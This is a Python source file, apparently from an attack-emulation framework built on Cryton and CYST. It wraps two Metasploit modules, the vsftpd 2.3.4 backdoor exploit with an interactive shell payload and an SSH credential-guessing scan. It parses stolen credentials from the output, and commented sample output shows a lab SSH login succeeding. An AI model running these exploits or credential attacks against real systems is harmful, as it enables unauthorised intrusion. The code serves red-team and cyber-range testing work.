from cyst_models.cryton.actions.action import Action, ExternalResources

import re


class ExploitServer(Action):
    def __init__(
        self,
        message_id: int,
        caller_id: str,
        external_resources: ExternalResources,
        target: str,
        service: str,
    ):
        self._exploit_name : str | None = None
        if service == "ftp":
            self._exploit_name = "unix/ftp/vsftpd_234_backdoor"
            module_arguments = {
                "module_name": "unix/ftp/vsftpd_234_backdoor",
                "datastore": {"payload": "cmd/unix/interact", "RHOSTS": target},
                "module_retries": 3,
            }
        elif service == "ssh":
            self._exploit_name = "scanner/ssh/ssh_login"
            module_arguments = {
                "module_name": "scanner/ssh/ssh_login",
                "datastore": {
                    "RHOSTS": target,
                    "USERNAME": "developer",
                    "PASSWORD": "developer",
                },
                "module_retries": 3,
            }
        else:
            raise RuntimeError(f"Unsupported service {service}.")

        template = {f"exploit-server-{message_id}": {"module": "metasploit", "arguments": module_arguments}}
        super().__init__(message_id, template, caller_id, external_resources)

    @property
    def processed_output(self):
        if self._exploit_name == "unix/ftp/vsftpd_234_backdoor":
            return self.output
        else:
            credentials: list[dict[str, str]] = list()
            for line in self.output.split("\n"):
                if line.startswith("[+]") and (x := re.search(r"Success: '(.+):(.+)' '", line)):
                    credentials.append({"username": x.groups()[0], "password": x.groups()[1]})
            return credentials


# RHOSTS => 10.0.1.2
# PASSWORD => developer
# USERNAME => developer
# [*] 10.0.1.2:22 - Starting bruteforce
# [+] 10.0.1.2:22 - Success: 'developer:developer' 'uid=1001(developer) gid=1001(developer) groups=1001(developer),27(sudo) Linux developer 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux '
# [*] SSH session 5 opened (10.0.0.2-10.0.0.1:38766 -> 10.0.1.2:22) at 2024-06-17 11:57:04 +0000
# [*] Scanned 1 of 1 hosts (100% complete)
# [*] Auxiliary module execution completed
# 0ZWYIUzLB8b3lXicGocV

# {'session_id': 5, 'credentials': [{'username': 'developer', 'password': 'developer'}]}
